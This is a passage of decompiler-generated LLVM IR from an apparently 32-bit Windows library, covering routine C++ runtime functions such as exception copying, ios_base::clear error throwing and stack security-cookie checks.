  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !333
  %2 = inttoptr i32 %1 to i32*, !insn.addr !333
  %3 = load i32, i32* %2, align 4, !insn.addr !333
  %4 = add i32 %arg2, 4, !insn.addr !334
  %5 = inttoptr i32 %4 to i32*, !insn.addr !334
  %6 = load i32, i32* %5, align 4, !insn.addr !334
  %7 = add i32 %3, 4, !insn.addr !335
  %8 = inttoptr i32 %7 to i32*, !insn.addr !335
  %9 = load i32, i32* %8, align 4, !insn.addr !335
  %10 = add i32 %6, 4, !insn.addr !336
  %11 = inttoptr i32 %10 to i32*, !insn.addr !336
  %12 = load i32, i32* %11, align 4, !insn.addr !336
  %13 = icmp eq i32 %9, %12, !insn.addr !336
  %14 = icmp eq i1 %13, false, !insn.addr !337
  br i1 %14, label %dec_label_pc_10001993, label %dec_label_pc_10001984, !insn.addr !337

dec_label_pc_10001984:                            ; preds = %dec_label_pc_10001960
  %15 = inttoptr i32 %arg2 to i32*, !insn.addr !338
  %16 = load i32, i32* %15, align 4, !insn.addr !338
  %17 = icmp eq i32 %9, %16, !insn.addr !338
  %18 = icmp eq i1 %17, false, !insn.addr !339
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !339
  br i1 %18, label %dec_label_pc_10001993, label %dec_label_pc_1000198a, !insn.addr !339

dec_label_pc_1000198a:                            ; preds = %dec_label_pc_10001984
  %19 = and i32 %9, -256, !insn.addr !340
  %20 = or i32 %19, 1, !insn.addr !340
  ret i32 %20, !insn.addr !341

dec_label_pc_10001993:                            ; preds = %dec_label_pc_10001984, %dec_label_pc_10001960
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %21 = and i32 %eax.0.reload, -256, !insn.addr !342
  ret i32 %21, !insn.addr !343
}

define i32 @function_100019a0(i32 %arg1, i32 %arg2) {
dec_label_pc_100019a0:
  %eax.0.reg2mem = alloca i32, !insn.addr !344
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !345
  %2 = inttoptr i32 %1 to i32*, !insn.addr !345
  %3 = load i32, i32* %2, align 4, !insn.addr !345
  %4 = add i32 %arg1, 4, !insn.addr !346
  %5 = inttoptr i32 %4 to i32*, !insn.addr !346
  %6 = load i32, i32* %5, align 4, !insn.addr !346
  %7 = add i32 %6, 4, !insn.addr !347
  %8 = inttoptr i32 %7 to i32*, !insn.addr !347
  %9 = load i32, i32* %8, align 4, !insn.addr !347
  %10 = icmp eq i32 %3, %9, !insn.addr !347
  %11 = icmp eq i1 %10, false, !insn.addr !348
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !348
  br i1 %11, label %dec_label_pc_100019c0, label %dec_label_pc_100019b2, !insn.addr !348

dec_label_pc_100019b2:                            ; preds = %dec_label_pc_100019a0
  %12 = inttoptr i32 %arg1 to i32*, !insn.addr !349
  %13 = load i32, i32* %12, align 4, !insn.addr !349
  %14 = icmp eq i32 %13, %arg2, !insn.addr !350
  %15 = icmp eq i1 %14, false, !insn.addr !351
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !351
  br i1 %15, label %dec_label_pc_100019c0, label %dec_label_pc_100019b9, !insn.addr !351

dec_label_pc_100019b9:                            ; preds = %dec_label_pc_100019b2
  %16 = and i32 %13, -256, !insn.addr !352
  %17 = or i32 %16, 1, !insn.addr !352
  ret i32 %17, !insn.addr !353

dec_label_pc_100019c0:                            ; preds = %dec_label_pc_100019b2, %dec_label_pc_100019a0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %18 = and i32 %eax.0.reload, -256, !insn.addr !354
  ret i32 %18, !insn.addr !355
}

define i32 @function_100019d0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100019d0:
  %esp.0.reg2mem = alloca i32, !insn.addr !356
  %stack_var_-48 = alloca i32, align 4
  %stack_var_16 = alloca i32, align 4
  %stack_var_-72 = alloca i8*, align 4
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !357
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !358
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !359
  %3 = load i32, i32* @global_var_1003e084, align 4, !insn.addr !360
  %4 = xor i32 %3, %1, !insn.addr !361
  store i32 %4, i32* %stack_var_-64, align 4, !insn.addr !362
  %5 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !362
  %6 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !363
  call void @__writefsdword(i32 0, i32 %6), !insn.addr !364
  %7 = icmp eq i32 %0, 0, !insn.addr !365
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !366
  br i1 %7, label %dec_label_pc_10001a1f, label %dec_label_pc_10001a10, !insn.addr !366

dec_label_pc_10001a10:                            ; preds = %dec_label_pc_100019d0
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10039bf4, i32 0, i32 0), i8** %stack_var_-72, align 4, !insn.addr !367
  %8 = ptrtoint i8** %stack_var_-72 to i32, !insn.addr !367
  %9 = call i32 @function_10005450(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10039bf4, i32 0, i32 0), i32 2), !insn.addr !368
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !368
  br label %dec_label_pc_10001a1f, !insn.addr !368

dec_label_pc_10001a1f:                            ; preds = %dec_label_pc_10001a10, %dec_label_pc_100019d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %10 = add i32 %esp.0.reload, -4, !insn.addr !369
  %11 = inttoptr i32 %10 to i32*, !insn.addr !369
  %12 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !369
  store i32 %12, i32* %11, align 4, !insn.addr !369
  %13 = call i32 @function_10001910(i32 ptrtoint (i32* @4 to i32)), !insn.addr !370
  %14 = add i32 %esp.0.reload, -8, !insn.addr !371
  %15 = inttoptr i32 %14 to i32*, !insn.addr !371
  store i32 -1, i32* %15, align 4, !insn.addr !371
  %16 = add i32 %esp.0.reload, -12, !insn.addr !372
  %17 = inttoptr i32 %16 to i32*, !insn.addr !372
  store i32 0, i32* %17, align 4, !insn.addr !372
  %18 = add i32 %esp.0.reload, -16, !insn.addr !373
  %19 = inttoptr i32 %18 to i32*, !insn.addr !373
  store i32 %13, i32* %19, align 4, !insn.addr !373
  %20 = call i32 @function_10005580(i8 1, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !374
  %21 = call i32 @function_100045f0(), !insn.addr !375
  %22 = add i32 %esp.0.reload, -20, !insn.addr !376
  %23 = inttoptr i32 %22 to i32*, !insn.addr !376
  %24 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !376
  store i32 %24, i32* %23, align 4, !insn.addr !376
  %25 = call i32 @function_10004660(i32 ptrtoint (i32* @4 to i32)), !insn.addr !377
  %26 = call i32 @function_100045f0(), !insn.addr !378
  %27 = load i32, i32* %stack_var_-16, align 4, !insn.addr !379
  call void @__writefsdword(i32 0, i32 %27), !insn.addr !380
  %28 = call i32 @"@__security_check_cookie@4"(), !insn.addr !381
  ret i32 %28, !insn.addr !382
}

define i32 @function_10001a80(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_10001a80:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %stack_var_-48 = alloca i32, align 4
  %2 = ptrtoint i8* %arg3 to i32, !insn.addr !383
  %3 = call i32 @function_10005320(i32 %2, i32 0, i32 -1, i8 0), !insn.addr !383
  %4 = call i32 @function_100019d0(i32* nonnull %stack_var_-48, i32 %arg1, i32 %arg2), !insn.addr !384
  %5 = add i32 %0, 4, !insn.addr !385
  %6 = inttoptr i32 %0 to i32*, !insn.addr !386
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %6, align 4, !insn.addr !386
  %7 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !387
  %8 = inttoptr i32 %5 to i64*, !insn.addr !388
  %9 = load i64, i64* %8, align 4, !insn.addr !388
  call void @__asm_movq.38(i64 %9, i128 %7), !insn.addr !388
  %10 = call i32 @___std_exception_copy(), !insn.addr !389
  store i32 ptrtoint (i32* @global_var_1002d3c0 to i32), i32* %6, align 4, !insn.addr !390
  %11 = call i32 @function_100045f0(), !insn.addr !391
  %12 = add i32 %0, 12, !insn.addr !392
  %13 = inttoptr i32 %12 to i32*, !insn.addr !392
  store i32 %arg1, i32* %13, align 4, !insn.addr !392
  %14 = add i32 %0, 16, !insn.addr !393
  %15 = inttoptr i32 %14 to i32*, !insn.addr !393
  store i32 %arg2, i32* %15, align 4, !insn.addr !393
  store i32 ptrtoint (%vtable_1002d434_type* @global_var_1002d434 to i32), i32* %6, align 4, !insn.addr !394
  %16 = call i32 @"@__security_check_cookie@4"(), !insn.addr !395
  ret i32 %16, !insn.addr !396
}

define i32 @function_10001b40(i8 %arg1) {
dec_label_pc_10001b40:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %2, 4, !insn.addr !397
  %4 = inttoptr i32 %2 to i32*, !insn.addr !398
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !398
  %5 = call i32 @___std_exception_destroy(i32 %3, i32 %0, i32 %1), !insn.addr !399
  %6 = and i8 %arg1, 1, !insn.addr !400
  %7 = icmp eq i8 %6, 0, !insn.addr !400
  br i1 %7, label %dec_label_pc_10001b69, label %dec_label_pc_10001b5e, !insn.addr !401

dec_label_pc_10001b5e:                            ; preds = %dec_label_pc_10001b40
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 ptrtoint (i32* @4 to i32)), !insn.addr !402
  br label %dec_label_pc_10001b69, !insn.addr !403

dec_label_pc_10001b69:                            ; preds = %dec_label_pc_10001b5e, %dec_label_pc_10001b40
  ret i32 %2, !insn.addr !404
}

define i32 @function_10001b70(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10001b70:
  %.in.reg2mem = alloca i32, !insn.addr !405
  %0 = call i32 @"?_Syserror_map@std@@YAPBDH@Z"(i32 %arg2), !insn.addr !406
  %1 = add i32 %arg1, 20, !insn.addr !407
  %2 = inttoptr i32 %1 to i32*, !insn.addr !407
  store i32 15, i32* %2, align 4, !insn.addr !407
  %3 = add i32 %arg1, 16, !insn.addr !408
  %4 = inttoptr i32 %3 to i32*, !insn.addr !408
  store i32 0, i32* %4, align 4, !insn.addr !408
  %5 = inttoptr i32 %arg1 to i8*, !insn.addr !409
  store i8 0, i8* %5, align 1, !insn.addr !409
  %6 = inttoptr i32 %0 to i8*, !insn.addr !410
  %7 = load i8, i8* %6, align 1, !insn.addr !410
  %8 = icmp eq i8 %7, 0, !insn.addr !410
  %9 = icmp eq i1 %8, false, !insn.addr !411
  store i32 %0, i32* %.in.reg2mem, !insn.addr !411
  br i1 %9, label %dec_label_pc_10001bc0.dec_label_pc_10001bc0_crit_edge, label %dec_label_pc_10001ba2, !insn.addr !411

dec_label_pc_10001ba2:                            ; preds = %dec_label_pc_10001b70
  %10 = call i32 @function_10005220(i32 %0, i32 0), !insn.addr !412
  ret i32 %arg1, !insn.addr !413

dec_label_pc_10001bc0.dec_label_pc_10001bc0_crit_edge: ; preds = %dec_label_pc_10001b70, %dec_label_pc_10001bc0.dec_label_pc_10001bc0_crit_edge
  %.in.reload = load i32, i32* %.in.reg2mem
  %11 = add i32 %.in.reload, 1
  %.phi.trans.insert = inttoptr i32 %11 to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 1
  %12 = icmp eq i8 %.pre, 0, !insn.addr !414
  %13 = icmp eq i1 %12, false, !insn.addr !415
  store i32 %11, i32* %.in.reg2mem, !insn.addr !415
  br i1 %13, label %dec_label_pc_10001bc0.dec_label_pc_10001bc0_crit_edge, label %dec_label_pc_10001bc7, !insn.addr !415

dec_label_pc_10001bc7:                            ; preds = %dec_label_pc_10001bc0.dec_label_pc_10001bc0_crit_edge
  %14 = sub i32 %11, %0, !insn.addr !416
  %15 = call i32 @function_10005220(i32 %0, i32 %14), !insn.addr !417
  ret i32 %arg1, !insn.addr !418
}

define i32 @function_10001be0() {
dec_label_pc_10001be0:
  ret i32 ptrtoint ([9 x i8]* @global_var_10039bf8 to i32), !insn.addr !419
}

define i32 @function_10001bf0(i32 %arg1, i32 %arg2) {
dec_label_pc_10001bf0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = icmp eq i32 %arg2, 1, !insn.addr !420
  %3 = icmp eq i1 %2, false, !insn.addr !421
  br i1 %3, label %dec_label_pc_10001c2f, label %dec_label_pc_10001c07, !insn.addr !421

dec_label_pc_10001c07:                            ; preds = %dec_label_pc_10001bf0
  %4 = add i32 %arg1, 20, !insn.addr !422
  %5 = inttoptr i32 %4 to i32*, !insn.addr !422
  store i32 15, i32* %5, align 4, !insn.addr !422
  %6 = add i32 %arg1, 16, !insn.addr !423
  %7 = inttoptr i32 %6 to i32*, !insn.addr !423
  store i32 0, i32* %7, align 4, !insn.addr !423
  %8 = inttoptr i32 %arg1 to i8*, !insn.addr !424
  store i8 0, i8* %8, align 1, !insn.addr !424
  %9 = call i32 @function_10005220(i32 ptrtoint ([22 x i8]* @global_var_10039c04 to i32), i32 21), !insn.addr !425
  ret i32 %arg1, !insn.addr !426

dec_label_pc_10001c2f:                            ; preds = %dec_label_pc_10001bf0
  %10 = call i32 @function_10001b70(i32 %arg1, i32 %arg2, i32 %0, i32 0, i32 %1), !insn.addr !427
  ret i32 %arg1, !insn.addr !428
}

define i32 @function_10001c40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001c40:
  %storemerge.reg2mem = alloca i32, !insn.addr !429
  %ecx.0.reg2mem = alloca i32, !insn.addr !429
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !430
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !431
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !432
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !433
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !434
  %4 = load i32, i32* %3, align 4, !insn.addr !434
  %5 = inttoptr i32 %arg1 to i8*, !insn.addr !435
  %6 = load i8, i8* %5, align 1, !insn.addr !435
  %7 = icmp eq i8 %6, 0, !insn.addr !435
  %8 = add i32 %arg2, 4, !insn.addr !436
  %9 = inttoptr i32 %8 to i32*, !insn.addr !436
  %10 = load i32, i32* %9, align 4, !insn.addr !436
  store i8 0, i8* %stack_var_-44, align 1, !insn.addr !437
  %11 = icmp eq i1 %7, false, !insn.addr !438
  store i32 %arg1, i32* %ecx.0.reg2mem, !insn.addr !438
  store i32 0, i32* %storemerge.reg2mem, !insn.addr !438
  br i1 %11, label %dec_label_pc_10001ca0, label %dec_label_pc_10001ca9, !insn.addr !438

dec_label_pc_10001ca0:                            ; preds = %dec_label_pc_10001c40, %dec_label_pc_10001ca0
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %12 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !439
  %13 = load i8, i8* %12, align 1, !insn.addr !439
  %14 = add i32 %ecx.0.reload, 1, !insn.addr !440
  %15 = icmp eq i8 %13, 0, !insn.addr !441
  %16 = icmp eq i1 %15, false, !insn.addr !442
  store i32 %14, i32* %ecx.0.reg2mem, !insn.addr !442
  br i1 %16, label %dec_label_pc_10001ca0, label %dec_label_pc_10001ca7, !insn.addr !442

dec_label_pc_10001ca7:                            ; preds = %dec_label_pc_10001ca0
  %17 = sub i32 %ecx.0.reload, %arg1, !insn.addr !443
  store i32 %17, i32* %storemerge.reg2mem, !insn.addr !443
  br label %dec_label_pc_10001ca9, !insn.addr !443

dec_label_pc_10001ca9:                            ; preds = %dec_label_pc_10001c40, %dec_label_pc_10001ca7
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %18 = call i32 @function_10005220(i32 %arg1, i32 %storemerge.reload), !insn.addr !444
  %19 = call i32 @function_10001a80(i32 %4, i32 %10, i8* nonnull %stack_var_-44), !insn.addr !445
  %20 = call i32 @function_100045f0(), !insn.addr !446
  %21 = inttoptr i32 %0 to i32*, !insn.addr !447
  store i32 ptrtoint (i32* @global_var_1002d468 to i32), i32* %21, align 4, !insn.addr !447
  %22 = load i32, i32* %stack_var_-16, align 4, !insn.addr !448
  call void @__writefsdword(i32 0, i32 %22), !insn.addr !449
  %23 = call i32 @"@__security_check_cookie@4"(), !insn.addr !450
  ret i32 %23, !insn.addr !451
}

define void @"?clear@ios_base@std@@QAEXH_N@Z"(i32* %result, i32 %arg2, i1 %arg3) local_unnamed_addr {
dec_label_pc_10001d00:
  %esp.2.reg2mem = alloca i32, !insn.addr !452
  %esp.1.reg2mem = alloca i32, !insn.addr !452
  %esp.0.reg2mem = alloca i32, !insn.addr !452
  %0 = ptrtoint i32* %result to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = and i32 %arg2, 23, !insn.addr !453
  %2 = add i32 %0, 12, !insn.addr !454
  %3 = inttoptr i32 %2 to i32*, !insn.addr !454
  store i32 %1, i32* %3, align 4, !insn.addr !454
  %4 = add i32 %0, 16, !insn.addr !455
  %5 = inttoptr i32 %4 to i32*, !insn.addr !455
  %6 = load i32, i32* %5, align 4, !insn.addr !455
  %7 = and i32 %6, %1, !insn.addr !456
  %8 = icmp eq i32 %7, 0, !insn.addr !456
  br i1 %8, label %dec_label_pc_10001d33, label %dec_label_pc_10001d19, !insn.addr !457

dec_label_pc_10001d19:                            ; preds = %dec_label_pc_10001d00
  %9 = icmp eq i1 %arg3, false, !insn.addr !458
  %10 = icmp eq i1 %9, false, !insn.addr !459
  br i1 %10, label %dec_label_pc_10001d39, label %dec_label_pc_10001d1f, !insn.addr !459

dec_label_pc_10001d1f:                            ; preds = %dec_label_pc_10001d19
  %11 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !460
  %12 = and i32 %7, 4
  %13 = icmp eq i32 %12, 0, !insn.addr !461
  %14 = icmp eq i1 %13, false, !insn.addr !462
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !462
  br i1 %14, label %dec_label_pc_10001d42, label %dec_label_pc_10001d2c, !insn.addr !462

dec_label_pc_10001d2c:                            ; preds = %dec_label_pc_10001d1f
  %15 = and i32 %7, 2
  %16 = icmp eq i32 %15, 0, !insn.addr !463
  %17 = icmp eq i1 %16, false, !insn.addr !464
  store i32 %11, i32* %esp.1.reg2mem, !insn.addr !464
  store i32 %11, i32* %esp.2.reg2mem, !insn.addr !464
  br i1 %17, label %dec_label_pc_10001d6d, label %dec_label_pc_10001d98, !insn.addr !464

dec_label_pc_10001d33:                            ; preds = %dec_label_pc_10001d00
  ret void, !insn.addr !465

dec_label_pc_10001d39:                            ; preds = %dec_label_pc_10001d19
  store i32 0, i32* %stack_var_-48, align 4, !insn.addr !466
  %18 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !466
  %19 = call i32 @"__CxxThrowException@8"(), !insn.addr !467
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !467
  br label %dec_label_pc_10001d42, !insn.addr !467

dec_label_pc_10001d42:                            ; preds = %dec_label_pc_10001d39, %dec_label_pc_10001d1f
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %20 = call i32 @function_10006980(), !insn.addr !468
  %21 = add i32 %esp.0.reload, 8, !insn.addr !469
  %22 = inttoptr i32 %21 to i32*, !insn.addr !469
  store i32 %20, i32* %22, align 4, !insn.addr !469
  %23 = add i32 %esp.0.reload, 4, !insn.addr !470
  %24 = add i32 %esp.0.reload, -4, !insn.addr !471
  %25 = inttoptr i32 %24 to i32*, !insn.addr !471
  store i32 %23, i32* %25, align 4, !insn.addr !471
  %26 = add i32 %esp.0.reload, -8, !insn.addr !472
  %27 = inttoptr i32 %26 to i32*, !insn.addr !472
  store i32 ptrtoint ([21 x i8]* @global_var_10039c1c to i32), i32* %27, align 4, !insn.addr !472
  %28 = call i32 @function_10001c40(i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !473
  %29 = add i32 %esp.0.reload, -12, !insn.addr !474
  %30 = inttoptr i32 %29 to i32*, !insn.addr !474
  store i32 ptrtoint (i32* @global_var_1003c324 to i32), i32* %30, align 4, !insn.addr !474
  %31 = add i32 %esp.0.reload, -16, !insn.addr !475
  %32 = inttoptr i32 %31 to i32*, !insn.addr !475
  store i32 %23, i32* %32, align 4, !insn.addr !475
  %33 = call i32 @"__CxxThrowException@8"(), !insn.addr !476
  store i32 %31, i32* %esp.1.reg2mem, !insn.addr !476
  br label %dec_label_pc_10001d6d, !insn.addr !476

dec_label_pc_10001d6d:                            ; preds = %dec_label_pc_10001d42, %dec_label_pc_10001d2c
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %34 = call i32 @function_10006980(), !insn.addr !477
  %35 = add i32 %esp.1.reload, 8, !insn.addr !478
  %36 = inttoptr i32 %35 to i32*, !insn.addr !478
  store i32 %34, i32* %36, align 4, !insn.addr !478
  %37 = add i32 %esp.1.reload, 4, !insn.addr !479
  %38 = add i32 %esp.1.reload, -4, !insn.addr !480
  %39 = inttoptr i32 %38 to i32*, !insn.addr !480
  store i32 %37, i32* %39, align 4, !insn.addr !480
  %40 = add i32 %esp.1.reload, -8, !insn.addr !481
  %41 = inttoptr i32 %40 to i32*, !insn.addr !481
  store i32 ptrtoint ([22 x i8]* @global_var_10039c34 to i32), i32* %41, align 4, !insn.addr !481
  %42 = call i32 @function_10001c40(i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !482
  %43 = add i32 %esp.1.reload, -12, !insn.addr !483
  %44 = inttoptr i32 %43 to i32*, !insn.addr !483
  store i32 ptrtoint (i32* @global_var_1003c324 to i32), i32* %44, align 4, !insn.addr !483
  %45 = add i32 %esp.1.reload, -16, !insn.addr !484
  %46 = inttoptr i32 %45 to i32*, !insn.addr !484
  store i32 %37, i32* %46, align 4, !insn.addr !484
  %47 = call i32 @"__CxxThrowException@8"(), !insn.addr !485
  store i32 %45, i32* %esp.2.reg2mem, !insn.addr !485
  br label %dec_label_pc_10001d98, !insn.addr !485

dec_label_pc_10001d98:                            ; preds = %dec_label_pc_10001d2c, %dec_label_pc_10001d6d
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %48 = call i32 @function_10006980(), !insn.addr !486
  %49 = add i32 %esp.2.reload, 8, !insn.addr !487
  %50 = inttoptr i32 %49 to i32*, !insn.addr !487
  store i32 %48, i32* %50, align 4, !insn.addr !487
  %51 = add i32 %esp.2.reload, 4, !insn.addr !488
  %52 = add i32 %esp.2.reload, -4, !insn.addr !489
  %53 = inttoptr i32 %52 to i32*, !insn.addr !489
  store i32 %51, i32* %53, align 4, !insn.addr !489
  %54 = add i32 %esp.2.reload, -8, !insn.addr !490
  %55 = inttoptr i32 %54 to i32*, !insn.addr !490
  store i32 ptrtoint ([21 x i8]* @global_var_10039c4c to i32), i32* %55, align 4, !insn.addr !490
  %56 = call i32 @function_10001c40(i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !491
  %57 = add i32 %esp.2.reload, -12, !insn.addr !492
  %58 = inttoptr i32 %57 to i32*, !insn.addr !492
  store i32 ptrtoint (i32* @global_var_1003c324 to i32), i32* %58, align 4, !insn.addr !492
  %59 = add i32 %esp.2.reload, -16, !insn.addr !493
  %60 = inttoptr i32 %59 to i32*, !insn.addr !493
  store i32 %51, i32* %60, align 4, !insn.addr !493
  %61 = call i32 @"__CxxThrowException@8"(), !insn.addr !494
  %62 = call i32 @__asm_int3(), !insn.addr !495
  %63 = call i32 @__asm_int3(), !insn.addr !496
  %64 = call i32 @__asm_int3(), !insn.addr !497
  %65 = call i32 @__asm_int3(), !insn.addr !498
  %66 = call i32 @__asm_int3(), !insn.addr !499
  %67 = call i32 @__asm_int3(), !insn.addr !500
  %68 = call i32 @__asm_int3(), !insn.addr !501
  %69 = call i32 @__asm_int3(), !insn.addr !502
  %70 = call i32 @__asm_int3(), !insn.addr !503
  %71 = call i32 @__asm_int3(), !insn.addr !504
  %72 = call i32 @__asm_int3(), !insn.addr !505
  %73 = call i32 @__asm_int3(), !insn.addr !506
  %74 = call i32 @__asm_int3(), !insn.addr !507
  %75 = add i32 %esp.2.reload, -20, !insn.addr !508
  %76 = inttoptr i32 %75 to i32*, !insn.addr !508
  %77 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !508
  store i32 %77, i32* %76, align 4, !insn.addr !508
  %78 = add i32 %esp.2.reload, -24, !insn.addr !509
  %79 = inttoptr i32 %78 to i32*, !insn.addr !509
  store i32 -1, i32* %79, align 4, !insn.addr !509
  %80 = add i32 %esp.2.reload, -28, !insn.addr !510
  %81 = inttoptr i32 %80 to i32*, !insn.addr !510
  store i32 268614886, i32* %81, align 4, !insn.addr !510
  %82 = call i32 @__readfsdword(i32 0), !insn.addr !511
  %83 = add i32 %esp.2.reload, -32, !insn.addr !512
  %84 = inttoptr i32 %83 to i32*, !insn.addr !512
  store i32 %82, i32* %84, align 4, !insn.addr !512
  %85 = add i32 %esp.2.reload, -36, !insn.addr !513
  %86 = inttoptr i32 %85 to i32*, !insn.addr !513
  %87 = load i32, i32* @global_var_1003e084, align 4, !insn.addr !514
  %88 = xor i32 %87, %75, !insn.addr !515
  %89 = add i32 %esp.2.reload, -40, !insn.addr !516
  %90 = inttoptr i32 %89 to i32*, !insn.addr !516
  store i32 %88, i32* %90, align 4, !insn.addr !516
  call void @__writefsdword(i32 0, i32 %83), !insn.addr !517
  %91 = add i32 %esp.2.reload, 60, !insn.addr !518
  %92 = inttoptr i32 %91 to i32*, !insn.addr !518
  %93 = load i32, i32* %92, align 4, !insn.addr !518
  %94 = load i32, i32* %58, align 4, !insn.addr !519
  store i32 0, i32* %79, align 4, !insn.addr !520
  %95 = add i32 %93, 4, !insn.addr !521
  %96 = inttoptr i32 %95 to i32*, !insn.addr !521
  %97 = load i32, i32* %96, align 4, !insn.addr !521
  %98 = add i32 %94, 4, !insn.addr !522
  %99 = inttoptr i32 %98 to i32*, !insn.addr !522
  store i32 %97, i32* %99, align 4, !insn.addr !522
  %100 = load i32, i32* %84, align 4, !insn.addr !523
  call void @__writefsdword(i32 0, i32 %100), !insn.addr !524
  ret void, !insn.addr !525
}

define i32 @function_10001e20(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001e20:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !526
  %3 = add i32 %0, 4, !insn.addr !527
  %4 = inttoptr i32 %0 to i32*, !insn.addr !528
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !528
  %5 = inttoptr i32 %3 to i64*, !insn.addr !529
  %6 = load i64, i64* %5, align 4, !insn.addr !529
  call void @__asm_movq.38(i64 %6, i128 %2), !insn.addr !529
  %7 = call i32 @___std_exception_copy(), !insn.addr !530
  store i32 ptrtoint (%vtable_1002d434_type* @global_var_1002d434 to i32), i32* %4, align 4, !insn.addr !531
  %8 = add i32 %arg1, 12, !insn.addr !532
  %9 = inttoptr i32 %8 to i32*, !insn.addr !532
  %10 = load i32, i32* %9, align 4, !insn.addr !532
  %11 = add i32 %0, 12, !insn.addr !533
  %12 = inttoptr i32 %11 to i32*, !insn.addr !533
  store i32 %10, i32* %12, align 4, !insn.addr !533
  %13 = add i32 %arg1, 16, !insn.addr !534
  %14 = inttoptr i32 %13 to i32*, !insn.addr !534
  %15 = load i32, i32* %14, align 4, !insn.addr !534
  %16 = add i32 %0, 16, !insn.addr !535
  %17 = inttoptr i32 %16 to i32*, !insn.addr !535
  store i32 %15, i32* %17, align 4, !insn.addr !535
  store i32 ptrtoint (i32* @global_var_1002d468 to i32), i32* %4, align 4, !insn.addr !536
  ret i32 %0, !insn.addr !537
}

define i32 @function_10001e70(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001e70:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_4()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !538
  %3 = add i32 %0, 4, !insn.addr !539
  %4 = inttoptr i32 %0 to i32*, !insn.addr !540
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !540
  %5 = inttoptr i32 %3 to i64*, !insn.addr !541
  %6 = load i64, i64* %5, align 4, !insn.addr !541
  call void @__asm_movq.38(i64 %6, i128 %2), !insn.addr !541
  %7 = call i32 @___std_exception_copy(), !insn.addr !542
  store i32 ptrtoint (%vtable_1002d434_type* @global_var_1002d434 to i32), i32* %4, align 4, !insn.addr !543
  %8 = add i32 %arg1, 12, !insn.addr !544
  %9 = inttoptr i32 %8 to i32*, !insn.addr !544
  %10 = load i32, i32* %9, align 4, !insn.addr !544
  %11 = add i32 %0, 12, !insn.addr !545
  %12 = inttoptr i32 %11 to i32*, !insn.addr !545
